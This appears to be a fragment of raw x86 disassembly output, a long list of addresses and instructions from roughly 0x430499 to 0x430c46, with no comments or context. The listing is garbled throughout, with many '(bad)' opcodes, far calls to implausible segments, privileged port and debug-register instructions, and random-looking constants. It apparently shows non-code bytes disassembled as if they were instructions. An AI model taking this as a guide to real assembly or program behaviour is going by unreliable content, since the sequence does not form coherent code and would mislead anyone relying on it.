  430499:	rol    BYTE PTR [ebp+0x12],0x8b
  43049d:	inc    ebp
  43049e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4304a4:	inc    ebp
  4304a5:	test   bh,al
  4304a7:	call   0xdcf8:0x898532f8
  4304ae:	inc    ebp
  4304af:	inc    ebp
  4304b0:	cmp    esi,DWORD PTR [ebx]
  4304b2:	pushf  
  4304b3:	mov    ecx,0xffb48dc7
  4304b8:	test   eax,ecx
  4304ba:	clc    
  4304bb:	dec    ebp
  4304bc:	inc    ebp
  4304bd:	mov    edi,DWORD PTR [ecx]
  4304bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4304c6:	test   edi,edi
  4304c8:	clc    
  4304c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4304d0:	(bad)  
  4304d1:	enter  0x18e8,0x85
  4304d5:	xor    eax,0xff459cf8
  4304da:	mov    edi,esp
  4304dc:	lock inc ebp
  4304de:	ret    
  4304df:	push   eax
  4304e0:	(bad)  
  4304e1:	idiv   BYTE PTR [ebp+0x0]
  4304e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4304ea:	add    BYTE PTR [ebx],dl
  4304ec:	jmp    0xce063e
  4304f1:	les    eax,FWORD PTR [ebp-0x35]
  4304f4:	mov    ecx,esi
  4304f6:	lock or al,cl
  4304f9:	clc    
  4304fa:	inc    ebp
  4304fb:	add    esi,DWORD PTR [ebx]
  4304fd:	jge    0x430502
  4304ff:	xor    edi,DWORD PTR [ebx]
  430501:	cmp    ecx,DWORD PTR [edi]
  430503:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430508:	mov    edi,DWORD PTR [ecx]
  43050a:	test   al,0xcc
  43050c:	dec    ebp
  43050d:	test   BYTE PTR [ebx],dh
  43050f:	pop    es
  430510:	xor    eax,DWORD PTR [eax]
  430512:	add    ecx,DWORD PTR [esi]
  430514:	add    ecx,eax
  430516:	psraw  mm0,mm1
  430519:	sub    BYTE PTR [ebp+0x38],cl
  43051c:	mov    edi,DWORD PTR [ebx]
  43051e:	lock int3 
  430520:	shl    edx,1
  430522:	rol    BYTE PTR [ebp+0xc],1
  430525:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43052c:	jmp    0x770576
  430531:	pushf  
  430532:	inc    ebp
  430533:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430539:	xor    ecx,ebx
  43053b:	add    ecx,esi
  43053d:	mov    esi,eax
  43053f:	enter  0x45af,0x8b
  430543:	xor    ecx,eax
  430545:	add    edx,DWORD PTR [ebp-0x77]
  430548:	sub    ecx,DWORD PTR [eax]
  43054a:	cmp    eax,DWORD PTR [ebp+0x77]
  43054d:	aad    0x8b
  43054f:	pushf  
  430550:	test   al,0xc7
  430552:	mov    DWORD PTR [eax-0x7747b00],ebp
  430558:	lods   al,BYTE PTR ds:[esi]
  430559:	inc    ebp
  43055a:	dec    ebp
  43055b:	cmp    dh,BYTE PTR [ebx]
  43055d:	pushf  
  43055e:	xor    eax,edi
  430560:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430567:	inc    ebp
  430568:	dec    ebp
  430569:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43056f:	mov    esp,0xf80585d0
  430574:	inc    ebp
  430575:	inc    ebp
  430576:	jmp    0x4305b6
  430578:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43057f:	dec    ebp
  430580:	xor    esi,DWORD PTR [ebx]
  430582:	add    eax,DWORD PTR [ebx]
  430584:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43058a:	dec    ebp
  43058b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430591:	out    dx,eax
  430592:	rol    BYTE PTR [eax],1
  430594:	add    eax,0xebc8458b
  430599:	dec    ebp
  43059a:	mov    ebp,DWORD PTR [ebx]
  43059c:	mov    esp,0x33f84d8b
  4305a1:	ret    
  4305a2:	xor    eax,esi
  4305a4:	add    ecx,eax
  4305a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4305ac:	dec    ebp
  4305ad:	inc    ebp
  4305ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4305b4:	ror    bl,1
  4305b6:	add    eax,0xebc645ce
  4305bb:	scas   eax,DWORD PTR es:[edi]
  4305bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4305c2:	xor    ebp,DWORD PTR [ebx]
  4305c4:	xor    edi,DWORD PTR [ebx]
  4305c6:	add    esi,DWORD PTR [edi+0x3]
  4305c9:	mov    ecx,DWORD PTR [edi]
  4305cb:	clc    
  4305cc:	rol    ebx,0x4d
  4305cf:	(bad)  
  4305d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4305d7:	mov    ah,0x45
  4305d9:	dec    ebp
  4305da:	jbe    0x43060f
  4305dc:	mov    esi,DWORD PTR [ebx]
  4305de:	call   0x334652e6
  4305e3:	rdpmc  
  4305e5:	rol    DWORD PTR [ebx],0x4d
  4305e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305ee:	inc    ebp
  4305ef:	ror    BYTE PTR [ebx+0x45450808],1
  4305f5:	jmp    0x10b0685
  4305fa:	inc    ebp
  4305fb:	inc    ebp
  4305fc:	(bad)  
  4305fd:	mov    ebx,eax
  4305ff:	clc    
  430600:	test   ebx,eax
  430602:	clc    
  430603:	retf   
  430604:	inc    ebp
  430605:	into   
  430606:	mov    esi,0x8b85afec
  43060c:	clc    
  43060d:	enter  0x5545,0x3b
  430611:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430618:	ret    
  430619:	mov    ah,0xc6
  43061b:	addr16 push 0x338b4545
  430621:	clc    
  430622:	add    eax,ebx
  430624:	loopne 0x4305f1
  430626:	dec    ebp
  430627:	into   
  430628:	mov    al,dh
  43062a:	or     BYTE PTR [edi-0x37ff748e],ch
  430630:	inc    ebp
  430631:	push   ebp
  430632:	mov    ebp,DWORD PTR [ebx]
  430634:	in     al,dx
  430635:	cmp    eax,ebx
  430637:	ja     0x43067e
  430639:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43063f:	inc    ebp
  430640:	call   0xd7c3:0x88f8328b
  430647:	retf   
  430648:	inc    ebp
  430649:	into   
  43064a:	mov    eax,esi
  43064c:	in     al,dx
  43064d:	scas   eax,DWORD PTR es:[edi]
  43064e:	retf   
  43064f:	mov    ecx,DWORD PTR [ebp-0x38]
  430652:	mov    edx,DWORD PTR [ebp-0x24]
  430655:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43065c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430663:	mov    eax,DWORD PTR [ebx]
  430665:	clc    
  430666:	loopne 0x43062b
  430668:	push   ebp
  430669:	retf   
  43066a:	mov    dh,al
  43066c:	adc    esi,ecx
  43066e:	jb     0x43061f
  430670:	add    BYTE PTR [ebx+0x558bc845],cl
  430676:	in     al,dx
  430677:	sub    eax,ebx
  430679:	cmp    ecx,ebx
  43067b:	mov    eax,esi
  43067d:	mov    esp,0x45af03ce
  430682:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430688:	mov    eax,ebx
  43068a:	in     al,dx
  43068b:	into   
  43068c:	dec    ebp
  43068d:	(bad)  
  43068e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430694:	rol    DWORD PTR [ebp+0x4d],0x89
  430698:	xor    esp,esp
  43069a:	sub    eax,DWORD PTR [ebp-0x75]
  43069d:	add    ebp,esp
  43069f:	mov    al,0x55
  4306a1:	inc    ebp
  4306a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4306a8:	retf   0x55dc
  4306ab:	inc    ebp
  4306ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4306af:	pushf  
  4306b0:	(bad)  
  4306b1:	(bad)  
  4306b2:	adc    eax,eax
  4306b4:	jb     0x43063b
  4306b6:	add    al,bh
  4306b8:	enter  0x8645,0x33
  4306bc:	inc    DWORD PTR [ebx]
  4306be:	(bad)  
  4306bf:	jmp    0x430706
  4306c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4306c7:	inc    ebp
  4306c8:	(bad)  
  4306c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4306cf:	call   0xb4d:0x88c132cb
  4306d6:	lea    eax,[ebp+0x8]
  4306d9:	xor    esi,DWORD PTR [edx+0x3]
  4306dc:	add    al,ah
  4306de:	inc    ebp
  4306df:	dec    ebp
  4306e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306e6:	data16 add ch,cl
  4306e9:	inc    ebp
  4306ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306f0:	inc    ebp
  4306f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306f7:	push   ebp
  4306f8:	(bad)  
  4306f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4306ff:	add    ch,ch
  430701:	inc    ebp
  430702:	dec    DWORD PTR [ebx-0x34332775]
  430708:	add    al,0x4d
  43070a:	inc    ebp
  43070b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430711:	call   0xc000:0x8b003201
  430718:	add    BYTE PTR [ebp-0x1],cl
  43071b:	xor    ecx,esp
  43071d:	xor    eax,DWORD PTR [eax]
  43071f:	add    edx,DWORD PTR [eax+0x3]
  430722:	mov    DWORD PTR [edi],ecx
  430724:	call   0x4288c7ea
  430729:	mov    DWORD PTR [ebp-0x20],esp
  43072c:	add    BYTE PTR [ebp+0x7d],al
  43072f:	mov    eax,DWORD PTR [eax]
  430731:	in     al,0x15
  430733:	ret    
  430734:	iret   
  430735:	(bad)  
  430736:	enter  0x14af,0x8b
  43073a:	(bad)  
  43073b:	in     al,dx
  43073c:	or     bl,cl
  43073e:	adc    cl,al
  430740:	push   ebp
  430741:	dec    ebp
  430742:	inc    eax
  430743:	mov    edx,DWORD PTR [ebp-0x20]
  430746:	jb     0x430713
  430748:	mov    ecx,esi
  43074a:	cld    
  43074b:	scas   eax,DWORD PTR es:[edi]
  43074c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430753:	mov    BYTE PTR [eax],0x8c
  430756:	push   0xffffff9a
  430758:	push   edi
  430759:	xor    dl,BYTE PTR [eax+0x3b]
  43075c:	mov    ecx,DWORD PTR [edi]
  43075e:	call   0x8c424cc1
  430763:	mov    eax,eax
  430765:	in     al,dx
  430766:	jge    0x4307b5
  430768:	mov    DWORD PTR [ebx],esi
  43076a:	int3   
  43076b:	add    eax,DWORD PTR [ebp+0xf]
  43076e:	xor    eax,ecx
  430770:	(bad)  
  430771:	dec    ebp
  430772:	pushf  
  430773:	xor    ecx,esp
  430775:	add    edi,DWORD PTR [edi]
  430777:	mov    eax,DWORD PTR [ebp-0x38]
  43077a:	aam    0x84
  43077c:	aam    0x9a
  43077e:	add    esi,DWORD PTR [edx]
  430780:	jmp    0x43070b
  430782:	mov    cl,al
  430784:	add    eax,0x14330f45
  430789:	mov    ecx,0xff458d80
  43078e:	jmp    0xc990175b
  430793:	mov    edx,ecx
  430795:	rol    BYTE PTR [ebp+0x330155],1
  43079b:	add    ecx,DWORD PTR [ebp+0xf]
  43079e:	xor    eax,edx
  4307a0:	(bad)  
  4307a1:	ror    DWORD PTR [eax],0x86
  4307a4:	jb     0x4307a3
  4307a6:	add    bh,bh
  4307a8:	clc    
  4307a9:	inc    ebp
  4307aa:	jb     0x430816
  4307ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4307b2:	xor    eax,0xc7d89c8b
  4307b7:	add    al,al
  4307b9:	push   0xf830c3
  4307be:	inc    ebp
  4307bf:	jne    0x4307f6
  4307c1:	push   0xffffff9c
  4307c3:	inc    edi
  4307c5:	adc    al,0xe8
  4307c7:	inc    ebp
  4307c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4307ce:	mov    ecx,DWORD PTR [eax]
  4307d0:	cld    
  4307d1:	or     DWORD PTR [ebp-0x34],0x33
  4307d5:	jbe    0x4307da
  4307d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4307da:	dec    ebp
  4307db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307e1:	mov    BYTE PTR [ebx],dh
  4307e3:	mov    eax,DWORD PTR [ebx]
  4307e5:	or     BYTE PTR [ecx+0x3b],dl
  4307e8:	dec    ebp
  4307e9:	int3   
  4307ea:	xor    ebp,edi
  4307ec:	add    eax,DWORD PTR [ebp+0x51]
  4307ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4307f2:	xor    eax,DWORD PTR [eax]
  4307f4:	add    ebp,DWORD PTR [eax+0x51]
  4307f7:	adc    BYTE PTR [eax+0x0],0x8b
  4307fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430801:	inc    ebp
  430802:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430808:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43080e:	dec    ebp
  43080f:	mov    esi,DWORD PTR [ebx]
  430811:	hlt    
  430812:	add    eax,ebx
  430814:	push   ecx
  430815:	inc    ebp
  430816:	dec    ebp
  430817:	aam    0xff
  430819:	aam    0xe4
  43081b:	(bad)  
  43081c:	retf   
  43081d:	mov    al,ds:0xc1ff39ce
  430822:	adc    al,0xc6
  430824:	inc    ebp
  430825:	and    eax,0x9c0f4c85
  43082a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430831:	cmp    BYTE PTR [ebx+0x39],0x0
  430835:	mov    dh,0xc7
  430837:	cmp    eax,eax
  430839:	jne    0x45440085
  43083f:	mov    edi,DWORD PTR [ebx]
  430841:	mov    eax,0x848bcb9c
  430846:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43084d:	or     BYTE PTR [edi],cl
  43084f:	(bad)  
  430850:	dec    ebp
  430851:	inc    edi
  430852:	add    bh,0x53
  430855:	or     cl,ch
  430857:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43085d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430863:	mov    esp,0xf802b588
  430868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430869:	inc    ebp
  43086a:	(bad)  
  43086b:	cmp    edi,edi
  43086d:	pushf  
  43086e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430875:	mov    ecx,DWORD PTR [ebp-0x340018]
  43087b:	into   
  43087c:	dec    DWORD PTR [ebx-0x7f72431c]
  430882:	push   0x5000ff01
  430887:	retf   
  430888:	inc    ebp
  430889:	into   
  43088a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430890:	push   eax
  430891:	into   
  430892:	call   0x4b0d22
  430897:	retf   
  430898:	add    dh,cl
  43089a:	add    bh,bh
  43089c:	mov    DWORD PTR [eax+ecx*1],edx
  43089f:	clc    
  4308a0:	inc    ebp
  4308a1:	inc    ebp
  4308a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4308a8:	push   0x1
  4308aa:	push   edi
  4308ab:	add    BYTE PTR [eax-0x35],dl
  4308ae:	mov    ecx,esi
  4308b0:	cld    
  4308b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4308b7:	into   
  4308b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4308bf:	xor    eax,DWORD PTR [ebp+0x3]
  4308c2:	jne    0x430915
  4308c4:	call   DWORD PTR [eax-0x3c]
  4308c7:	mov    DWORD PTR [ecx-0x18],edx
  4308ca:	mov    edi,edi
  4308cc:	call   0x8b464e55
  4308d1:	add    ah,ah
  4308d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4308d7:	add    edi,edi
  4308d9:	add    al,ch
  4308db:	inc    ebp
  4308dc:	push   ecx
  4308dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4308e3:	mov    al,0xc7
  4308e5:	test   esp,esp
  4308e7:	clc    
  4308e8:	test   DWORD PTR [ebp-0x8],ecx
  4308eb:	add    BYTE PTR [ebp+0x53],0x34
  4308ef:	jmp    0x8bcc9190
  4308f4:	in     al,dx
  4308f5:	or     BYTE PTR [ebp-0xf],al
  4308f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4308fe:	hlt    
  4308ff:	mov    eax,DWORD PTR [ebp-0x50]
  430902:	xor    esi,ecx
  430904:	add    eax,DWORD PTR [eax+0x4f086689]
  43090a:	inc    ebp
  43090b:	adc    ebp,0x68
  43090e:	pushf  
  43090f:	inc    edi
  430911:	add    al,ch
  430913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430914:	test   edi,edi
  430916:	clc    
  430917:	inc    DWORD PTR [ebp-0x73]
  43091a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43091e:	(bad)  
  43091f:	push   ecx
  430920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430921:	jne    0x4308a8
  430923:	push   eax
  430924:	clc    
  430925:	test   DWORD PTR [ebp-0x1],eax
  430928:	cmp    bh,bh
  43092a:	pushf  
  43092b:	mov    eax,edi
  43092d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430934:	inc    ebp
  430935:	push   edi
  430936:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43093e:	dec    ebp
  43093f:	add    BYTE PTR [ebx],dh
  430941:	inc    ebp
  430942:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430948:	enter  0x8401,0x0
  43094c:	add    al,BYTE PTR [eax]
  43094e:	add    bh,bh
  430950:	out    dx,eax
  430951:	sbb    BYTE PTR [eax],al
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43095a:	sub    esi,DWORD PTR [ebx]
  43095c:	mov    ebp,DWORD PTR [eax-0x8]
  43095f:	add    bl,0x0
  430962:	(bad)  
  430963:	cmp    eax,ecx
  430965:	or     BYTE PTR [edx+0x750114],al
  43096b:	inc    DWORD PTR [ebp+0x18]
  43096e:	mov    eax,DWORD PTR [ebp-0x8]
  430971:	mov    ebx,eax
  430973:	(bad)  
  430974:	retf   
  430975:	inc    ebp
  430976:	into   
  430977:	mov    esi,eax
  430979:	int3   
  43097a:	scas   eax,DWORD PTR es:[edi]
  43097b:	push   es
  43097c:	mov    esi,DWORD PTR [ebp-0xc]
  43097f:	call   DWORD PTR [ebp+0x18]
  430982:	sub    edi,DWORD PTR [ebp+0x3b]
  430985:	mov    esi,DWORD PTR [edi-0x34]
  430988:	mov    eax,DWORD PTR [ebp-0x8]
  43098b:	xor    eax,0xc7c69cc3
  430990:	mov    esp,0x8b8500dc
  430995:	clc    
  430996:	mov    esp,0x338b4d45
  43099b:	in     al,0x33
  43099d:	ret    
  43099e:	add    eax,esi
  4309a0:	add    eax,DWORD PTR [ebp+0xf]
  4309a3:	mov    eax,ecx
  4309a5:	in     al,0x4d
  4309a7:	ret    
  4309a8:	mov    eax,esi
  4309aa:	in     al,dx
  4309ab:	inc    ebp
  4309ac:	rol    edi,1
  4309ae:	sar    al,1
  4309b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4309b6:	add    BYTE PTR [ebx],bh
  4309b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4309bf:	test   ebx,eax
  4309c1:	clc    
  4309c2:	retf   
  4309c3:	inc    ebp
  4309c4:	into   
  4309c5:	cmp    esi,eax
  4309c7:	pushf  
  4309c8:	scas   eax,DWORD PTR es:[edi]
  4309c9:	(bad)  
  4309ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4309d1:	inc    ebp
  4309d2:	cmp    edi,DWORD PTR [edi]
  4309d4:	ja     0x430972
  4309d6:	mov    eax,edi
  4309d8:	mov    esp,0x458567a8
  4309dd:	clc    
  4309de:	mov    eax,DWORD PTR [ebp-0x8]
  4309e1:	mov    eax,ebx
  4309e3:	in     al,dx
  4309e4:	retf   
  4309e5:	ret    
  4309e6:	into   
  4309e7:	mov    dh,0x7d
  4309ea:	scas   eax,DWORD PTR es:[edi]
  4309eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309f1:	add    BYTE PTR [ebx],ch
  4309f3:	jmp    0xba0b33
  4309f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4309fb:	mov    eax,DWORD PTR [ebp-0x14]
  4309fe:	inc    ebp
  4309ff:	enter  0x458b,0xf8
  430a03:	xor    eax,ebx
  430a05:	add    ecx,ebx
  430a07:	cmp    ecx,esi
  430a09:	shufps xmm7,xmm4,0xaf
  430a0d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430a13:	dec    ebp
  430a14:	sub    esi,DWORD PTR [ebx]
  430a16:	cmp    esi,DWORD PTR [ebx]
  430a18:	ja     0x430a1d
  430a1a:	mov    eax,DWORD PTR [ebx]
  430a1c:	lods   al,BYTE PTR ds:[esi]
  430a1d:	mov    db0,ecx
  430a20:	inc    ebp
  430a21:	dec    ebp
  430a22:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430a28:	retf   
  430a29:	rol    dh,1
  430a2b:	or     al,0xce
  430a2d:	inc    ebp
  430a2e:	scas   eax,DWORD PTR es:[edi]
  430a2f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430a35:	add    BYTE PTR [ebx],ch
  430a37:	add    BYTE PTR [ebx],bh
  430a39:	inc    ebp
  430a3a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a40:	inc    ebp
  430a41:	retf   
  430a42:	mov    ecx,esi
  430a44:	clc    
  430a45:	(bad)  
  430a46:	retf   
  430a47:	scas   eax,DWORD PTR es:[edi]
  430a48:	ret    
  430a49:	mov    ecx,esi
  430a4b:	hlt    
  430a4c:	(bad)  
  430a4d:	push   ebp
  430a4e:	scas   eax,DWORD PTR es:[edi]
  430a4f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a55:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a5b:	add    BYTE PTR [ebx],al
  430a5d:	mov    eax,eax
  430a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a60:	inc    ebp
  430a61:	dec    ebp
  430a62:	xor    eax,0x89339c33
  430a67:	add    edx,eax
  430a69:	add    eax,DWORD PTR [ebp+0xf]
  430a6c:	xor    al,0xc1
  430a6e:	pushf  
  430a6f:	dec    ebp
  430a70:	(bad)  
  430a71:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430a77:	rol    BYTE PTR [ebp+0x5],1
  430a7a:	xor    eax,DWORD PTR [ebp+0x3]
  430a7d:	jmp    0x430a6a
  430a7f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a85:	xor    eax,DWORD PTR [ebp+0x33]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	rol    BYTE PTR [ebx],1
  430a8c:	test   BYTE PTR [edi],cl
  430a8e:	call   0xb8b:0x884d32c1
  430a95:	in     al,dx
  430a96:	inc    ebp
  430a97:	shl    DWORD PTR [ebx],1
  430a99:	rol    BYTE PTR [ebx],1
  430a9b:	add    eax,0xeb4d45e0
  430aa0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430aa6:	add    BYTE PTR [ebx],dh
  430aa8:	inc    ebp
  430aa9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430aaf:	rdpmc  
  430ab1:	rol    DWORD PTR [ebx],0x4d
  430ab4:	loopne 0x430a41
  430ab6:	push   ebp
  430ab7:	in     al,dx
  430ab8:	mov    cl,dl
  430aba:	adc    eax,edx
  430abc:	jb     0x430ac3
  430abe:	add    BYTE PTR [ebp+0x45],al
  430ac1:	jmp    0x430a4e
  430ac3:	mov    ebx,eax
  430ac5:	test   al,0xcb
  430ac7:	dec    ebp
  430ac8:	dec    ebp
  430ac9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430acf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  430ad5:	dec    ebp
  430ad6:	mov    al,0x8b
  430ad8:	dec    ebp
  430ad9:	in     al,dx
  430ada:	xor    edx,ecx
  430adc:	xor    edx,eax
  430ade:	add    eax,DWORD PTR [ebp+0x3]
  430ae1:	jbe    0x430af2
  430ae3:	mov    eax,ecx
  430ae5:	test   al,0x45
  430ae7:	dec    ebp
  430ae8:	mov    DWORD PTR [ebx],esi
  430aea:	loopne 0x430b1f
  430aec:	inc    ebp
  430aed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430af3:	rol    esi,0x45
  430af6:	scas   eax,DWORD PTR es:[edi]
  430af7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430afd:	mov    eax,ecx
  430aff:	hlt    
  430b00:	dec    ebp
  430b01:	inc    ebp
  430b02:	mov    eax,edi
  430b04:	loopne 0x430ade
  430b06:	retf   
  430b07:	test   esi,ecx
  430b09:	clc    
  430b0a:	scas   eax,DWORD PTR es:[edi]
  430b0b:	inc    ebp
  430b0c:	mov    eax,edi
  430b0e:	fdiv   st,st(0)
  430b10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430b16:	call   0xf8b:0x3b9c323b
  430b1d:	fcomp  DWORD PTR [esi-0x3d]
  430b20:	inc    esi
  430b22:	mov    ebp,DWORD PTR [eax-0x10]
  430b25:	inc    ebp
  430b26:	dec    ebp
  430b27:	xor    esi,DWORD PTR [ebx]
  430b29:	add    eax,DWORD PTR [ebx]
  430b2b:	loopne 0x430b3c
  430b2d:	dec    ebp
  430b2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430b35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430b3b:	lock call 0xf48b:0x894532c3
  430b43:	rol    BYTE PTR [ebp-0x7c],1
  430b46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430b4c:	call   edi
  430b4e:	enter  0x4d45,0x8b
  430b52:	mov    esi,eax
  430b54:	fmul   st(3),st
  430b56:	push   ebp
  430b57:	dec    ebp
  430b58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b5e:	ret    0xc19a
  430b61:	xor    al,BYTE PTR [esi-0x280276]
  430b67:	dec    ebp
  430b68:	jne    0x430b9d
  430b6a:	mov    eax,DWORD PTR [ebx]
  430b6c:	cld    
  430b6d:	loopne 0x430b1f
  430b6f:	push   ebp
  430b70:	add    DWORD PTR [eax+0x72851100],ecx
  430b76:	inc    DWORD PTR [eax]
  430b78:	inc    DWORD PTR [ebp-0x75]
  430b7b:	mov    edi,esp
  430b7d:	lock add bl,0x1
  430b81:	retf   
  430b82:	add    dh,al
  430b84:	xor    dh,cl
  430b86:	inc    ebp
  430b87:	scas   eax,DWORD PTR es:[edi]
  430b88:	mov    eax,DWORD PTR [ebx]
  430b8a:	shl    al,0x0
  430b8d:	inc    ebp
  430b8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b94:	call   0x461dcc
  430b99:	ud0    eax,ecx
  430b9c:	adc    al,0x4d
  430b9e:	inc    ebp
  430b9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430ba5:	lock push 0x338055
  430bab:	add    eax,DWORD PTR [eax]
  430bad:	ud0    ecx,edx
  430bb0:	sbb    BYTE PTR [ebp+0x5e],dl
  430bb3:	xor    ecx,ecx
  430bb5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430bbc:	push   ecx
  430bbd:	add    BYTE PTR [ebp-0x38],cl
  430bc0:	mov    DWORD PTR [esi-0x740004],eax
  430bc6:	cld    
  430bc7:	inc    ebp
  430bc8:	xchg   ebx,eax
  430bc9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430bcf:	xabort 0xaf
  430bd2:	icebp  
  430bd3:	mov    esi,DWORD PTR [ebp-0x28]
  430bd6:	(bad)  
  430bd7:	retf   
  430bd8:	or     ecx,eax
  430bda:	(bad)  
  430bdb:	dec    ebp
  430bdc:	pop    es
  430bdd:	(bad)  
  430bde:	(bad)  
  430bdf:	or     BYTE PTR [esi],al
  430be1:	jb     0x430ba9
  430be3:	add    BYTE PTR [ebx],al
  430be5:	inc    ebp
  430be6:	(bad)  
  430be7:	mov    ecx,DWORD PTR [edx]
  430be9:	fadd   st(6),st
  430beb:	ret    
  430bec:	add    ah,BYTE PTR [esi-0x37]
  430bef:	int    0x55
  430bf1:	sub    ebp,esp
  430bf3:	add    edx,DWORD PTR [ecx-0x14]
  430bf6:	inc    ebp
  430bf7:	inc    ebp
  430bf8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bfe:	cld    
  430bff:	(bad)  
  430c00:	(bad)  
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	loopne 0x430c3f
  430c04:	mov    DWORD PTR [edi],ecx
  430c06:	mov    ebp,ebp
  430c08:	clc    
  430c09:	push   eax
  430c0b:	push   DWORD PTR [ebp-0x4]
  430c0e:	mov    BYTE PTR [ebp+0xa],0xff
  430c12:	(bad)  
  430c13:	int3   
  430c14:	or     BYTE PTR [eax],al
  430c16:	(bad)  
  430c17:	lea    eax,[edi]
  430c19:	ins    BYTE PTR es:[edi],dx
  430c1a:	(bad)  
  430c1b:	inc    DWORD PTR [ecx]
  430c1d:	push   eax
  430c1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430c22:	leave  
  430c23:	les    edx,FWORD PTR [ebp+0x0]
  430c26:	in     al,dx
  430c27:	call   DWORD PTR [ecx-0x75]
  430c2a:	inc    ebp
  430c2b:	cld    
  430c2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430c32:	cld    
  430c33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430c39:	sti    
  430c3a:	mov    eax,DWORD PTR [eax]
  430c3c:	clc    
  430c3d:	test   eax,esi
  430c3f:	je     0x430cb6
  430c41:	mov    eax,esi
  430c43:	cld    
  430c44:	add    al,0x80
  430c46:	add    WORD PTR [ecx+0x0],ax
